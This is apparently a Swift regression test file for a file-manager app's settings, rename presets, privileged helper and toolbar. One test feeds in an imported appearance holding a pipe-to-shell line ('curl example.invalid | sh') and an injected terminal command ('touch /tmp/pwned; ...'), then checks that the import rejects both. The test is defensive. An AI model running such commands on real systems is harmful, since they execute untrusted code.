import Foundation
import PorpoiseCore
import Testing

@testable import PorpoiseServices

/// Regressions found by the second codebase sweep (Services).
@Suite(.isolatedSettings)
struct SweepTwoServicesTests {
    @Test func importedAppearanceCantChangeWhatTerminalsRun() throws {
        let s = Settings.shared
        var shared = AppearancePreferences()
        shared.themeName = "Nord"
        shared.shell = .custom
        shared.customShell = "/bin/sh"
        shared.shellArguments = ["-c", "curl example.invalid | sh"]
        shared.externalTerminal = .custom
        shared.externalCommand = "touch /tmp/pwned; true {dir}"
        try s.importAppearance(JSONEncoder().encode(shared))
        let now = s.appearancePreferences
        #expect(now.themeName == "Nord")
        let defaults = AppearancePreferences()
        #expect(now.shell == defaults.shell && now.customShell == defaults.customShell && now.shellArguments.isEmpty)
        #expect(now.externalTerminal == defaults.externalTerminal && now.externalCommand == defaults.externalCommand)
    }

    @Test func anUnreadablePresetDoesntLoseTheOthers() throws {
        let good = BatchRenamePreset(name: "Good", rules: [.changeCase(.lower)])
        let goodJSON = try JSONSerialization.jsonObject(with: JSONEncoder().encode(good))
        let future: [String: Any] = ["name": "Future", "rules": [["unknownRule": [:]]], "extensionMode": ["keep": [:]]]
        Settings.store.set(try JSONSerialization.data(withJSONObject: [goodJSON, future]), forKey: "batchRenamePresets")
        #expect(Settings.shared.batchRenamePresets == [good])
        Settings.shared.saveBatchRenamePreset(BatchRenamePreset(name: "New"))
        #expect(Settings.shared.batchRenamePresets.map(\.name) == ["Good", "New"])
    }

    /// What the app sends its helper passes the helper's own check of arguments.
    @Test func everythingTheAppSendsTheHelperIsAccepted() {
        let items = [URL(fileURLWithPath: "/Applications/Old App.app"), URL(fileURLWithPath: "/Library/Something/-rf")]
        for kind in [FileOperationKind.delete, .trash, .move, .copy, .link] {
            let plan = FileOperationsController.administratorCommands(kind, items, targets: [:], to: URL(fileURLWithPath: "/Users/Shared/dest"))
            for c in plan.commands { #expect(HelperRequests.refusal(c) == nil, "\(c)") }
        }
        let renames =
            FileOperationsController.renameCommands(URL(fileURLWithPath: "/Applications/a.app"), to: URL(fileURLWithPath: "/Applications/A.app"))
            + FileOperationsController.renameCommands(URL(fileURLWithPath: "/Applications/a.app"), to: URL(fileURLWithPath: "/Applications/b.app"))
        for c in renames { #expect(HelperRequests.refusal(c) == nil, "\(c)") }
    }

    @Test func anUnknownToolbarItemKeepsTheRestOfTheLayout() throws {
        Settings.store.set(try JSONEncoder().encode(["reload", "location", "bogus", "reload"]), forKey: "toolbarCommands")
        #expect(Settings.shared.toolbarCommands == [.reload, .location])
        Settings.store.set(try JSONEncoder().encode(["reload", "search"]), forKey: "toolbarCommands")
        #expect(Settings.shared.toolbarCommands == [.reload, .search, .location])
    }
}

